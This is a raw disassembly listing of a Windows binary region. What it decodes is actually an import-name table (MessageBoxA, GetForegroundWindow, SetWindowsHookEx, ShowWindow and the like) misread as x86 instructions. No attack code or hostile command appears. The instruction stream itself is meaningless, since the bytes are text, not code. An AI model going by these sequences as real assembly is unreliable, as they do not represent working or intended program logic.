  4289b4:	outs   dx,BYTE PTR ds:[esi]
  4289b5:	je     0x4289b7
  4289b7:	lahf   
  4289b8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4289bc:	jo     0x428a1f
  4289be:	je     0x428a23
  4289c0:	push   0x7373654d
  4289c5:	popa   
  4289c6:	addr16 gs inc ecx
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	fwait
  4289cc:	add    dl,BYTE PTR [ebp+0x6e]
  4289cf:	ins    BYTE PTR es:[edi],dx
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	popa   
  4289d2:	fs dec ebx
  4289d4:	gs jns 0x428a39
  4289d7:	outs   dx,DWORD PTR ds:[esi]
  4289d8:	popa   
  4289d9:	jb     0x428a3f
  4289db:	dec    esp
  4289dc:	popa   
  4289dd:	jns    0x428a4e
  4289df:	jne    0x428a55
  4289e1:	add    BYTE PTR [eax],al
  4289e3:	out    0x0,eax
  4289e5:	inc    esi
  4289e6:	jb     0x428a49
  4289e8:	ins    DWORD PTR es:[edi],dx
  4289e9:	gs push edx
  4289eb:	arpl   WORD PTR gs:[eax+eax*1-0x21],si
  4289f0:	add    BYTE PTR [ebp+0x78],al
  4289f3:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4289fb:	jae    0x428a42
  4289fd:	js     0x4289ff
  4289ff:	rol    BYTE PTR [edx],0x77
  428a02:	jae    0x428a74
  428a04:	jb     0x428a6f
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	je     0x428a6f
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],bh
  428a0c:	add    dl,BYTE PTR [ebx+0x65]
  428a0f:	je     0x428a54
  428a11:	jne    0x428a85
  428a13:	jae    0x428a84
  428a15:	jb     0x428a17
  428a17:	sub    eax,DWORD PTR [eax]
  428a19:	inc    ebx
  428a1a:	push   0x654e7261
  428a1f:	js     0x428a95
  428a21:	inc    ebp
  428a22:	js     0x428a65
  428a24:	add    BYTE PTR [eax+0x2],bl
  428a27:	push   ebx
  428a28:	gs je  0x428a7d
  428a2b:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  428a30:	add    DWORD PTR [edi+0x65],eax
  428a33:	je     0x428a88
  428a35:	arpl   WORD PTR [edx+0x6f],si
  428a38:	ins    BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	push   eax
  428a3b:	outs   dx,DWORD PTR ds:[esi]
  428a3c:	jae    0x428a3e
  428a3e:	add    BYTE PTR [edx+eax*1],bl
  428a41:	push   ebx
  428a42:	arpl   WORD PTR [edx+0x65],si
  428a45:	outs   dx,BYTE PTR gs:[esi]
  428a47:	push   esp
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	inc    ebx
  428a4a:	ins    BYTE PTR es:[edi],dx
  428a4b:	imul   esp,DWORD PTR [ebp+0x6e],0xb9000074
  428a52:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428a56:	fs dec ebp
  428a58:	outs   dx,BYTE PTR gs:[esi]
  428a5a:	jne    0x428ab3
  428a5c:	add    BYTE PTR [eax+0x1],al
  428a5f:	inc    edi
  428a60:	gs je  0x428ab0
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	outs   dx,BYTE PTR ds:[esi]
  428a65:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  428a6d:	push   edi
  428a6e:	add    BYTE PTR [eax+0x1],ch
  428a71:	inc    edi
  428a72:	gs je  0x428acc
  428a75:	imul   ebp,DWORD PTR [esi+0x64],0x4100776f
  428a7c:	add    dl,BYTE PTR [ebx+0x65]
  428a7f:	je     0x428ac7
  428a81:	outs   dx,DWORD PTR ds:[esi]
  428a82:	arpl   WORD PTR [ebp+0x73],si
  428a85:	add    BYTE PTR [eax],al
  428a87:	bound  eax,QWORD PTR [ecx]
  428a89:	inc    edi
  428a8a:	gs je  0x428ae1
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	jo     0x428ae7
  428a90:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428a97:	and    DWORD PTR [edx],eax
  428a99:	push   ebx
  428a9a:	outs   dx,BYTE PTR gs:[esi]
  428a9c:	fs inc esp
  428a9e:	ins    BYTE PTR es:[edi],dx
  428a9f:	addr16 dec ecx
  428aa1:	je     0x428b08
  428aa3:	ins    DWORD PTR es:[edi],dx
  428aa4:	dec    ebp
  428aa5:	gs jae 0x428b1b
  428aa8:	popa   
  428aa9:	addr16 gs inc ecx
  428aac:	add    BYTE PTR [eax+eax*1+0x43],al
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  428ab8:	jb     0x428aba
  428aba:	add    BYTE PTR [esi+0x1],dl
  428abd:	inc    edi
  428abe:	gs je  0x428b14
  428ac1:	arpl   WORD PTR [edx+0x6f],si
  428ac4:	ins    BYTE PTR es:[edi],dx
  428ac5:	ins    BYTE PTR es:[edi],dx
  428ac6:	push   edx
  428ac7:	popa   
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	add    BYTE PTR gs:[bx+si],al
  428acd:	or     DWORD PTR [ecx],eax
  428acf:	inc    edi
  428ad0:	gs je  0x428b16
  428ad3:	jne    0x428b47
  428ad5:	jae    0x428b46
  428ad7:	jb     0x428b29
  428ad9:	outs   dx,DWORD PTR ds:[esi]
  428ada:	jae    0x428adc
  428adc:	add    BYTE PTR [ecx+0x2],bl
  428adf:	push   ebx
  428ae0:	gs je  0x428b35
  428ae3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  428ae8:	jo     0x428b5e
  428aea:	jns    0x428aec
  428aec:	add    BYTE PTR [eax+0x2],ch
  428aef:	push   ebx
  428af0:	gs je  0x428b48
  428af3:	jae    0x428b5a
  428af5:	jb     0x428b46
  428af7:	bound  ebp,QWORD PTR [edx+0x65]
  428afa:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428afe:	outs   dx,WORD PTR ds:[esi]
  428b00:	jb     0x428b6f
  428b02:	popa   
  428b03:	je     0x428b6e
  428b05:	outs   dx,DWORD PTR ds:[esi]
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	push   edi
  428b08:	add    BYTE PTR [ebx],ch
  428b0a:	add    dl,BYTE PTR [ebx+0x65]
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	fs dec ebp
  428b10:	gs jae 0x428b86
  428b13:	popa   
  428b14:	addr16 gs push edi
  428b17:	add    BYTE PTR [eax],al
  428b19:	loop   0x428b1b
  428b1b:	inc    esi
  428b1c:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  428b23:	outs   dx,DWORD PTR ds:[esi]
  428b24:	ja     0x428b6b
  428b26:	js     0x428b69
  428b28:	add    BYTE PTR [eax],bl
  428b2a:	add    DWORD PTR [edi+0x65],eax
  428b2d:	je     0x428b78
  428b2f:	arpl   WORD PTR [edi+0x6e],bp
  428b32:	dec    ecx
  428b33:	outs   dx,BYTE PTR ds:[esi]
  428b34:	outs   dx,WORD PTR ds:[esi]
  428b36:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428b3d:	arpl   WORD PTR [eax+0x54],bp
  428b40:	outs   dx,DWORD PTR ds:[esi]
  428b41:	push   esp
  428b42:	push   0x69577369
  428b47:	outs   dx,BYTE PTR ds:[esi]
  428b48:	outs   dx,DWORD PTR fs:[esi]
  428b4a:	ja     0x428b4c
  428b4c:	add    BYTE PTR [ecx+0x616f4c01],ch
  428b52:	fs inc edx
  428b54:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb004170
  428b5c:	add    DWORD PTR [edi+0x65],eax
  428b5f:	je     0x428ba5
  428b61:	inc    ebx
  428b62:	inc    ebp
  428b63:	js     0x428b65
  428b65:	mov    al,ds:0x57734901
  428b6a:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428b71:	test   DWORD PTR [ecx],eax
  428b73:	dec    ecx
  428b74:	outs   dx,BYTE PTR ds:[esi]
  428b75:	jae    0x428bdc
  428b77:	jb     0x428bed
  428b79:	dec    ebp
  428b7a:	outs   dx,BYTE PTR gs:[esi]
  428b7c:	jne    0x428bc7
  428b7e:	je     0x428be5
  428b80:	ins    DWORD PTR es:[edi],dx
  428b81:	push   edi
  428b82:	add    BYTE PTR [esi+0x73795302],al
  428b88:	je     0x428bef
  428b8a:	ins    DWORD PTR es:[edi],dx
  428b8b:	push   eax
  428b8c:	popa   
  428b8d:	jb     0x428bf0
  428b8f:	ins    DWORD PTR es:[edi],dx
  428b90:	gs je  0x428bf8
  428b93:	jb     0x428c08
  428b95:	dec    ecx
  428b96:	outs   dx,BYTE PTR ds:[esi]
  428b97:	outs   dx,WORD PTR ds:[esi]
  428b99:	push   edi
  428b9a:	add    BYTE PTR [ebx+0x2],dh
  428b9d:	push   ebx
  428b9e:	gs je  0x428bf8
  428ba1:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428ba8:	js     0x428c1e
  428baa:	inc    ecx
  428bab:	add    BYTE PTR [eax],al
  428bad:	rol    BYTE PTR [ecx],1
  428baf:	dec    ebp
  428bb0:	gs jae 0x428c26
  428bb3:	popa   
  428bb4:	addr16 gs inc edx
  428bb7:	outs   dx,DWORD PTR ds:[esi]
  428bb8:	js     0x428bff
  428bba:	js     0x428c13
  428bbc:	add    BYTE PTR ds:0x74654701,dh
  428bc2:	dec    ebp
  428bc3:	outs   dx,BYTE PTR gs:[esi]
  428bc5:	jne    0x428c10
  428bc7:	je     0x428c2e
  428bc9:	ins    DWORD PTR es:[edi],dx
  428bca:	dec    ecx
  428bcb:	outs   dx,BYTE PTR ds:[esi]
  428bcc:	outs   dx,WORD PTR ds:[esi]
  428bce:	push   edi
  428bcf:	add    BYTE PTR [eax],al
  428bd1:	jge    0x428bd5
  428bd3:	push   ebx
  428bd4:	push   0x6353776f
  428bd9:	jb     0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	inc    edx
  428bde:	popa   
  428bdf:	jb     0x428be1
  428be1:	cmp    al,0x0
  428be3:	inc    ebx
  428be4:	push   0x4d6b6365
  428be9:	outs   dx,BYTE PTR gs:[esi]
  428beb:	jne    0x428c3f
  428bed:	popa   
  428bee:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  428bf6:	add    BYTE PTR [edx+0x616f4c01],ch
  428bfc:	fs inc edx
  428bfe:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab005770
  428c06:	add    BYTE PTR [edx+esi*2+0x61],al
  428c0a:	ja     0x428c4d
  428c0c:	outs   dx,BYTE PTR ds:[esi]
  428c0d:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  428c14:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  428c19:	mov    cl,0x2
  428c1b:	push   esi
  428c1c:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  428c20:	push   ebx
  428c21:	arpl   WORD PTR [ecx+0x6e],sp
  428c24:	push   edi
  428c25:	add    BYTE PTR [eax],al
  428c27:	add    DWORD PTR [ecx],0x65536e49
  428c2d:	outs   dx,BYTE PTR ds:[esi]
  428c2e:	fs dec ebp
  428c30:	gs jae 0x428ca6
  428c33:	popa   
  428c34:	addr16 gs inc ebp
  428c37:	js     0x428c39
  428c39:	ins    DWORD PTR es:[edi],dx
  428c3a:	add    DWORD PTR [edi+0x65],eax
  428c3d:	je     0x428c96
  428c3f:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428c46:	outs   dx,BYTE PTR ds:[esi]
  428c47:	addr16 push edi
  428c49:	add    BYTE PTR [eax],al
  428c4b:	jle    0x428c4e
  428c4d:	dec    eax
  428c4e:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  428c56:	jne    0x428ca1
  428c58:	je     0x428cbf
  428c5a:	ins    DWORD PTR es:[edi],dx
  428c5b:	add    BYTE PTR [eax],al
  428c5d:	xor    DWORD PTR [eax],eax
  428c5f:	inc    ebx
  428c60:	push   0x72507261
  428c65:	gs jbe 0x428cbf
  428c68:	add    ah,ah
  428c6a:	add    BYTE PTR [esi+0x69],al
  428c6d:	outs   dx,BYTE PTR ds:[esi]
  428c6e:	fs push edi
  428c70:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  428c77:	sub    al,BYTE PTR [edx]
  428c79:	push   ebx
  428c7a:	outs   dx,BYTE PTR gs:[esi]
  428c7c:	fs dec ebp
  428c7e:	gs jae 0x428cf4
  428c81:	popa   
  428c82:	addr16 gs push esp
  428c85:	imul   ebp,DWORD PTR [ebp+0x65],0x5774756f
  428c8c:	add    BYTE PTR [ebx],al
  428c8e:	add    dl,BYTE PTR [edx+0x65]
  428c91:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428c99:	popa   
  428c9a:	jae    0x428d0f
  428c9c:	inc    ebp
  428c9d:	js     0x428ce0
  428c9f:	add    BYTE PTR [eax],al
  428ca1:	xchg   esi,eax
  428ca2:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	jae    0x428d15
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ebp
  428cad:	gs jae 0x428d23
  428cb0:	popa   
  428cb1:	add    BYTE PTR gs:[bx+si],al
  428cb5:	add    BYTE PTR [edx],0x53
  428cb8:	push   0x6957776f
  428cbd:	outs   dx,BYTE PTR ds:[esi]
  428cbe:	outs   dx,DWORD PTR fs:[esi]
  428cc0:	ja     0x428d03
  428cc2:	jae    0x428d3d
  428cc4:	outs   dx,BYTE PTR ds:[esi]
  428cc5:	arpl   WORD PTR [eax],ax
  428cc7:	mov    BYTE PTR [eax],0x45
  428cca:	outs   dx,BYTE PTR ds:[esi]
  428ccb:	fs push esp
  428ccd:	popa   
  428cce:	jae    0x428d3b
  428cd0:	add    bl,dh
  428cd2:	add    DWORD PTR [eax+0x6f],edx
  428cd5:	jae    0x428d4b
  428cd7:	push   ecx
  428cd8:	jne    0x428d43
  428cda:	je     0x428d29
  428cdc:	gs jae 0x428d52
  428cdf:	popa   
  428ce0:	add    BYTE PTR gs:[bp+si+0x1],bl
  428ce5:	inc    edi
  428ce6:	gs je  0x428d3c
  428ce9:	jns    0x428d5e
  428ceb:	inc    ebx
  428cec:	outs   dx,DWORD PTR ds:[esi]
  428ced:	ins    BYTE PTR es:[edi],dx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	jb     0x428d33
  428cf1:	jb     0x428d68
  428cf3:	jae    0x428d5d
  428cf5:	add    BYTE PTR [eax],al
  428cf7:	or     eax,DWORD PTR [eax]
  428cf9:	inc    ecx
  428cfa:	je     0x428d70
  428cfc:	popa   
  428cfd:	arpl   WORD PTR [eax+0x54],bp
  428d00:	push   0x64616572
  428d05:	dec    ecx
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	jo     0x428d7e
  428d09:	je     0x428d0b
  428d0b:	adc    BYTE PTR [ecx],al
  428d0d:	inc    edi
  428d0e:	gs je  0x428d55
  428d11:	ins    BYTE PTR es:[edi],dx
  428d12:	addr16 dec ecx
  428d14:	je     0x428d7b
  428d16:	ins    DWORD PTR es:[edi],dx
  428d17:	dec    ecx
  428d18:	outs   dx,BYTE PTR ds:[esi]
  428d19:	je     0x428d1b
  428d1b:	mov    eax,0x61724400
  428d20:	ja     0x428d75
  428d22:	je     0x428d85
  428d24:	je     0x428d8b
  428d26:	push   edi
  428d27:	add    BYTE PTR [eax],al
  428d29:	adc    eax,DWORD PTR [edx]
  428d2b:	push   edx
  428d2c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428d35:	outs   dx,BYTE PTR ds:[esi]
  428d36:	outs   dx,DWORD PTR fs:[esi]
  428d38:	ja     0x428d87
  428d3a:	gs jae 0x428db0
  428d3d:	popa   
  428d3e:	addr16 gs push edi
  428d41:	add    BYTE PTR [eax],al
  428d43:	or     al,BYTE PTR [eax]
  428d45:	inc    ecx
  428d46:	jb     0x428dba
  428d48:	popa   
  428d49:	outs   dx,BYTE PTR ds:[esi]
  428d4a:	addr16 gs dec ecx
  428d4d:	arpl   WORD PTR [edi+0x6e],bp
  428d50:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  428d57:	ja     0x428dcc
  428d59:	add    BYTE PTR [eax],al
  428d5b:	jnp    0x428d5f
  428d5d:	push   ebx
  428d5e:	push   0x7543776f
  428d63:	jb     0x428dd8
  428d65:	outs   dx,DWORD PTR ds:[esi]
  428d66:	jb     0x428d68
  428d68:	add    BYTE PTR [eax],ch
  428d6a:	add    BYTE PTR [ebx+0x68],al
  428d6d:	popa   
  428d6e:	jb     0x428dbc
  428d70:	outs   dx,DWORD PTR ds:[esi]
  428d71:	ja     0x428dd8
  428d73:	jb     0x428db7
  428d75:	jne    0x428ddd
  428d77:	push   di
  428d79:	add    BYTE PTR [eax],al
  428d7b:	mov    esi,0x756f6d02
  428d80:	jae    0x428de7
  428d82:	pop    edi
  428d83:	gs jbe 0x428deb
  428d86:	outs   dx,BYTE PTR ds:[esi]
  428d87:	je     0x428d89
  428d89:	mov    bl,0x0
  428d8b:	inc    esp
  428d8c:	jb     0x428def
  428d8e:	ja     0x428dd9
  428d90:	arpl   WORD PTR [edi+0x6e],bp
  428d93:	add    BYTE PTR [eax],al
  428d95:	adc    al,BYTE PTR [edx]
  428d97:	push   edx
  428d98:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428da1:	outs   dx,BYTE PTR ds:[esi]
  428da2:	outs   dx,DWORD PTR fs:[esi]
  428da4:	ja     0x428df3
  428da6:	gs jae 0x428e1c
  428da9:	popa   
  428daa:	addr16 gs inc ecx
  428dad:	add    BYTE PTR [eax],al
  428daf:	daa    
  428db0:	add    DWORD PTR [edi+0x65],eax
  428db3:	je     0x428e00
  428db5:	gs jns 0x428e1a
  428db8:	outs   dx,DWORD PTR ds:[esi]
  428db9:	popa   
  428dba:	jb     0x428e20
  428dbc:	push   esp
  428dbd:	jns    0x428e2f
  428dbf:	add    BYTE PTR gs:[edi+0x66654400],cl
  428dc6:	push   edi
  428dc7:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428dce:	outs   dx,DWORD PTR ds:[esi]
  428dcf:	arpl   WORD PTR [edi+0x0],dx
  428dd2:	add    BYTE PTR [eax+0x536e4901],al
  428dd8:	outs   dx,BYTE PTR gs:[esi]
  428dda:	fs dec ebp
  428ddc:	gs jae 0x428e52
  428ddf:	popa   
  428de0:	add    BYTE PTR gs:[bp+di],dh
  428de4:	add    DWORD PTR [edi+0x65],eax
  428de7:	je     0x428e36
  428de9:	outs   dx,BYTE PTR gs:[esi]
  428deb:	jne    0x428e36
  428ded:	je     0x428e54
  428def:	ins    DWORD PTR es:[edi],dx
  428df0:	dec    ecx
  428df1:	inc    esp
  428df2:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  428df9:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x73490190
  428e01:	inc    ebx
  428e02:	push   0x6f4c7261
  428e07:	ja     0x428e6e
  428e09:	jb     0x428e4c
  428e0b:	add    BYTE PTR [eax],al
  428e0d:	jmp    0x74a7d512
  428e12:	inc    ecx
  428e13:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428e17:	gs push edi
  428e19:	imul   ebp,DWORD PTR [esi+0x64],0x3a00776f
  428e20:	add    dl,BYTE PTR [ebx+0x65]
  428e23:	je     0x428e68
  428e25:	jne    0x428e99
  428e27:	jae    0x428e98
  428e29:	jb     0x428e7b
  428e2b:	outs   dx,DWORD PTR ds:[esi]
  428e2c:	jae    0x428e2e
  428e2e:	add    BYTE PTR ds:0x74654701,dl
  428e34:	inc    esi
  428e35:	outs   dx,DWORD PTR ds:[esi]
  428e36:	jb     0x428e9d
  428e38:	addr16 jb 0x428eaa
  428e3b:	jne    0x428eab
  428e3d:	fs push edi
  428e3f:	imul   ebp,DWORD PTR [esi+0x64],0x2300776f
  428e46:	add    DWORD PTR [edi+0x65],eax
  428e49:	je     0x428e96
  428e4b:	gs jns 0x428eb0
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	popa   
  428e50:	jb     0x428eb6
  428e52:	dec    esp
  428e53:	popa   
  428e54:	jns    0x428ec5
  428e56:	jne    0x428ecc
  428e58:	dec    esp
  428e59:	imul   esi,DWORD PTR [ebx+0x74],0x43006300
  428e60:	jb     0x428ec7
  428e62:	popa   
  428e63:	je     0x428eca
  428e65:	push   edi
  428e66:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428e6d:	push   edi
  428e6e:	add    BYTE PTR [edx+0x766e4901],cl
  428e74:	popa   
  428e75:	ins    BYTE PTR es:[edi],dx
  428e76:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  428e7e:	add    BYTE PTR [eax],bh
  428e80:	add    BYTE PTR [ebx+0x68],al
  428e83:	popa   
  428e84:	jb     0x428edb
  428e86:	jo     0x428ef8
  428e88:	gs jb  0x428ecd
  428e8b:	jne    0x428ef3
  428e8d:	push   di
  428e8f:	add    BYTE PTR [eax],al
  428e91:	mov    al,BYTE PTR [edx]
  428e93:	push   esp
  428e94:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  428e9c:	ja     0x428f11
  428e9e:	add    dh,dh
  428ea0:	add    BYTE PTR [edi+0x65],al
  428ea3:	je     0x428ee8
  428ea5:	ins    BYTE PTR es:[edi],dx
  428ea6:	popa   
  428ea7:	jae    0x428f1c
  428ea9:	dec    ecx
  428eaa:	outs   dx,BYTE PTR ds:[esi]
  428eab:	outs   dx,WORD PTR ds:[esi]
  428ead:	inc    ebp
  428eae:	js     0x428f07
  428eb0:	add    BYTE PTR [esi+0x736e4901],al
  428eb6:	gs jb  0x428f2d
  428eb9:	dec    ebp
  428eba:	outs   dx,BYTE PTR gs:[esi]
  428ebc:	jne    0x428f15
  428ebe:	add    BYTE PTR [eax],bh
  428ec0:	add    DWORD PTR [edi+0x65],eax
  428ec3:	je     0x428f12
  428ec5:	outs   dx,BYTE PTR gs:[esi]
  428ec7:	jne    0x428f1c
  428ec9:	je     0x428f3d
  428ecb:	imul   ebp,DWORD PTR [esi+0x67],0x11000041
  428ed2:	add    DWORD PTR [edi+0x65],eax
  428ed5:	je     0x428f1b
  428ed7:	ins    BYTE PTR es:[edi],dx
  428ed8:	addr16 dec ecx
  428eda:	je     0x428f41
  428edc:	ins    DWORD PTR es:[edi],dx
  428edd:	push   esp
  428ede:	gs js  0x428f55
  428ee1:	inc    ecx
  428ee2:	add    BYTE PTR [eax+0x44734901],bl
  428ee8:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428eef:	jae    0x428f64
  428ef1:	popa   
  428ef2:	addr16 gs push edi
  428ef5:	add    BYTE PTR [eax],al
  428ef7:	mov    al,ds:0x73694400
  428efc:	jo     0x428f5f
  428efe:	je     0x428f63
  428f00:	push   0x7373654d
  428f05:	popa   
  428f06:	addr16 gs push edi
  428f09:	add    BYTE PTR [eax],al
  428f0b:	js     0x428f0e
  428f0d:	inc    edi
  428f0e:	gs je  0x428f68
  428f11:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428f18:	js     0x428f8e
  428f1a:	push   edi
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	sub    eax,0x6e655302
  428f22:	fs dec esi
  428f24:	outs   dx,DWORD PTR ds:[esi]
  428f25:	je     0x428f90
  428f27:	data16 jns 0x428f77
  428f2a:	gs jae 0x428fa0
  428f2d:	popa   
  428f2e:	addr16 gs push edi
  428f31:	add    BYTE PTR [eax],al
  428f33:	and    BYTE PTR [edx],al
  428f35:	push   ebx
  428f36:	arpl   WORD PTR [edx+0x6f],si
  428f39:	ins    BYTE PTR es:[edi],dx
  428f3a:	ins    BYTE PTR es:[edi],dx
  428f3b:	push   edi
  428f3c:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428f43:	add    BYTE PTR [eax],al
  428f45:	add    WORD PTR [edi+0x65],ax
  428f49:	je     0x428fa0
  428f4b:	jae    0x428fb2
  428f4d:	jb     0x428f9e
  428f4f:	bound  ebp,QWORD PTR [edx+0x65]
  428f52:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f56:	outs   dx,WORD PTR ds:[esi]
  428f58:	jb     0x428fc7
  428f5a:	popa   
  428f5b:	je     0x428fc6
  428f5d:	outs   dx,DWORD PTR ds:[esi]
  428f5e:	outs   dx,BYTE PTR ds:[esi]
  428f5f:	push   edi
  428f60:	add    ch,dh
  428f62:	add    DWORD PTR [eax+0x6f],edx
  428f65:	jae    0x428fdb
  428f67:	push   esp
  428f68:	push   0x64616572
  428f6d:	dec    ebp
  428f6e:	gs jae 0x428fe4
  428f71:	popa   
  428f72:	addr16 gs push edi
  428f75:	add    BYTE PTR [eax],al
  428f77:	mov    eax,DWORD PTR [ecx]
  428f79:	dec    ecx
  428f7a:	outs   dx,BYTE PTR ds:[esi]
  428f7b:	jbe    0x428fe2
  428f7d:	jb     0x428ff3
  428f7f:	push   edx
  428f80:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428f85:	xchg   edi,eax
  428f86:	add    DWORD PTR [ecx+0x73],ecx
  428f89:	inc    esp
  428f8a:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428f91:	jae    0x429006
  428f93:	popa   
  428f94:	addr16 gs inc ecx
  428f97:	add    BYTE PTR [eax],al
  428f99:	mov    ch,0x0
  428f9b:	inc    esp
  428f9c:	jb     0x428fff
  428f9e:	ja     0x428fed
  428fa0:	outs   dx,BYTE PTR gs:[esi]
  428fa2:	jne    0x428fe6
  428fa4:	popa   
  428fa5:	jb     0x428fa7
  428fa7:	push   ebp
  428fa8:	push   ebx
  428fa9:	inc    ebp
  428faa:	push   edx
  428fab:	xor    esi,DWORD PTR [edx]
  428fad:	cs fs ins BYTE PTR es:[edi],dx
  428fb0:	ins    BYTE PTR es:[edi],dx
  428fb1:	add    BYTE PTR [eax],al
  428fb3:	int3   
  428fb4:	add    DWORD PTR [ebx+0x65],edx
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428fbd:	imul   esi,DWORD PTR [eax+0x52],0x88006e67
  428fc4:	add    BYTE PTR [ebx+0x72],al
  428fc7:	gs popa 
  428fc9:	je     0x429030
  428fcb:	inc    edx
  428fcc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428fd4:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428fdb:	rol    BYTE PTR [eax],0x45
  428fde:	outs   dx,BYTE PTR ds:[esi]
  428fdf:	fs push eax
  428fe1:	popa   
  428fe2:	je     0x42904c
  428fe4:	add    dh,cl
  428fe6:	add    DWORD PTR [ebx+0x65],edx
  428fe9:	ins    BYTE PTR es:[edi],dx
  428fea:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428fef:	push   0x65
  428ff1:	arpl   WORD PTR [eax+eax*1+0x0],si
  428ff5:	fiadd  WORD PTR [ecx]
  428ff7:	push   ebx
  428ff8:	gs je  0x42903f
  428ffb:	dec    ecx
  428ffc:	inc    edx
  428ffd:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  429005:	imul   esp,DWORD PTR [ebx+0x65],0x43009e00
  42900c:	jb     0x429073
  42900e:	popa   
  42900f:	je     0x429076
  429011:	inc    esi
  429012:	outs   dx,DWORD PTR ds:[esi]
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	je     0x42906d
  429016:	add    dh,dh
  429018:	add    DWORD PTR [ebx+0x65],edx
  42901b:	je     0x429070
  42901d:	je     0x429091
  42901f:	gs je  0x429085
  429022:	push   0x4d746c42
  429027:	outs   dx,DWORD PTR ds:[esi]
  429028:	fs add BYTE PTR gs:[eax+0x65724300],dh
  429030:	popa   
  429031:	je     0x429098
  429033:	push   ebx
  429034:	outs   dx,DWORD PTR ds:[esi]
  429035:	ins    BYTE PTR es:[edi],dx
  429036:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  42903e:	add    bh,cl
  429040:	add    DWORD PTR [ebx+0x65],edx
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  429049:	ins    BYTE PTR es:[edi],dx
  42904a:	gs je  0x4290c1
  42904d:	add    BYTE PTR gs:[edx+0x63655201],bh
  429054:	je     0x4290ac
  429056:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  42905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42905e:	add    DWORD PTR [eax+0x61],edx
  429061:	je     0x4290a5
  429063:	ins    BYTE PTR es:[edi],dx
  429064:	je     0x429066
  429066:	add    BYTE PTR [ebx+0x65724300],dl
  42906c:	popa   
  42906d:	je     0x4290d4
  42906f:	inc    esp
  429070:	dec    ecx
  429071:	inc    edx
  429072:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xdc000070
  42907a:	add    DWORD PTR [ebx+0x65],edx
  42907d:	je     0x4290c3
  42907f:	dec    ecx
  429080:	inc    edx
  429081:	inc    ebx
  429082:	outs   dx,DWORD PTR ds:[esi]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	outs   dx,DWORD PTR ds:[esi]
  429085:	jb     0x4290db
  429087:	popa   
  429088:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  42908c:	add    BYTE PTR [eax+0x1],al
  42908f:	inc    edi
  429090:	gs je  0x4290d7
  429093:	dec    ecx
  429094:	inc    edx
